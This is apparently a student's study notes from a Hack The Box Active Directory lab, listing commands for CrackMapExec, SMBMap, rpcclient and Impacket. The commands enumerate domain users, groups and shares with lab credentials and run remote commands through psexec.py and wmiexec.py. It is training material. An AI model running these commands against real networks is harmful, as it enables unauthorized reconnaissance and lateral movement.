## CrackMapExec
#### CME Help Menu

```shell
3kjS@htb[/htb]$ crackmapexec -h
```
#### CME Options (SMB)

```shell
3kjS@htb[/htb]$ crackmapexec smb -h
```
#### CME - Domain User Enumeration

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
#### CME - Domain Group Enumeration

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
#### CME - Logged On Users

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
#### CME Share Searching

We can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access).
#### Share Enumeration - Domain Controller

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
#### Spider_plus

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

```shell
3kjS@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
```
![[Screenshot 2026-05-25 at 16.42.19.png]]
## SMBMap
#### SMBMap To Check Access

```shell
3kjS@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
#### Recursive List Of All Directories

```shell
3kjS@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
## rpcclient

```shell
rpcclient -U "" -N 172.16.5.5
```
#### SMB NULL Session with rpcclient
![[Screenshot 2026-05-25 at 16.51.42.png]]
#### rpcclient Enumeration

- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:0x457 Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
#### RPCClient User Enumeration By RID

```shell
rpcclient $> queryuser 0x457
```
![[Screenshot 2026-05-25 at 16.52.21.png]]
#### Enumdomusers

```shell
rpcclient $> enumdomusers
```
![[Screenshot 2026-05-25 at 16.58.29.png]]
## Impacket Toolkit
#### Psexec.py

Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`.
#### Using psexec.py

```shell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
![[Screenshot 2026-05-25 at 16.59.16.png]]
#### wmiexec.py

```shell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
![[Screenshot 2026-05-25 at 16.59.54.png]]
